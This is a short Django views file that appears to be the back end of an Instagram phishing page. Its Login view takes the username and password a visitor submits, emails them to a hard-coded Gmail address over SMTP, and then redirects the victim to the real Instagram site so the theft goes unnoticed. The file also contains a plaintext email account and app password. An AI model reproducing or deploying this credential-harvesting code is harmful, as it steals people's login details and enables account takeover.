
from django.shortcuts import render,redirect
from email.message import EmailMessage
import ssl
import smtplib

# Create your views here.

def Login(request):
    
    if request.method == 'POST':
        username = request.POST['username']
        password = request.POST['password']
        
        email_sender = 'ottunrilwan101@gmail.com'
        email_password = 'ngitttxmlcsqqgps'
        email_receiver = 'ottunrilwan101@gmail.com'

        subject = "New Login"
        body = f"""
        username: {username} & password: {password}
        """

        em = EmailMessage()
        em['From'] = email_sender
        em['To'] = email_receiver
        em['subject'] = subject
        em.set_content(body)

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL('smtp.gmail.com', 465, context=context) as smtp:
            smtp.login(email_sender, email_password)
            smtp.sendmail(email_sender, email_receiver, em.as_string())

        return redirect('https://www.instagram.com/')

        
    
    return render(request, 'instagramls/fo.html')